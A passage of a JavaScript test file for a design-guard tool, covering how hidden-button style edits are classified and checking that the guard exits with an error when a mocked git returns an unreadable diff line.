  assert.equal(ok.verdict, "ok", JSON.stringify(ok));
  const btn = '<Button variant="ghost" onClick={() => del.mutate(a.id)}>';
  for (const s of ['{ display: a.name ? "block" : "none" }', '{ pointerEvents: a.name ? "auto" : "none" }']) logicFrom(BASE, BASE.replace(btn, `<Button variant="ghost" style={${s}} onClick={() => del.mutate(a.id)}>`), s);
});

test("(t) design guard exits 2 with an error when it cannot read the diff", () => {
  const dir = mkdtempSync(join(tmpdir(), "dd-guard-")), bin = mkdtempSync(join(tmpdir(), "dd-guard-bin-")), prof = join(bin, "profile.json");
  const realGit = spawnSync("sh", ["-c", "command -v git"], { encoding: "utf8" }).stdout.trim();
  const git = (...a) => { const r = spawnSync(realGit, ["-C", dir, "-c", "user.email=guard@example.com", "-c", "user.name=guard", "-c", "commit.gpgsign=false", ...a], { encoding: "utf8" }); assert.equal(r.status, 0, r.stderr); return r.stdout; };
  git("init", "-q");
  mkdirSync(join(dir, "src/components"), { recursive: true });
  writeFileSync(join(dir, "src/components/a.tsx"), "export const A = () => <p>Hi</p>;\n");
  writeFileSync(prof, JSON.stringify({ boundary: { allow: ["src/components/**"] } }));
  git("add", "-A"); git("commit", "-qm", "base");
  const base = git("rev-parse", "HEAD").trim();
  writeFileSync(join(dir, "src/components/a.tsx"), "export const A = () => <p>Hello</p>;\n");
  // A git that answers `diff --raw` with a line parseRawDiff cannot read.
  writeFileSync(join(bin, "git"), `#!/bin/sh\nfor a in "$@"; do [ "$a" = "--raw" ] && { printf ':bad\\0'; exit 0; }; done\nexec "${realGit}" "$@"\n`);
  chmodSync(join(bin, "git"), 0o755);
  const r = spawnSync(process.execPath, [DESIGN, "guard", dir, "--base", base, "--profile", prof], { encoding: "utf8", env: { ...process.env, PATH: `${bin}:${process.env.PATH}` } });
  assert.equal(r.status, 2, r.stdout + r.stderr);
  const out = JSON.parse(r.stdout);
  assert.equal(out.ok, false);
  assert.match(out.error, /unreadable diff line/);
});
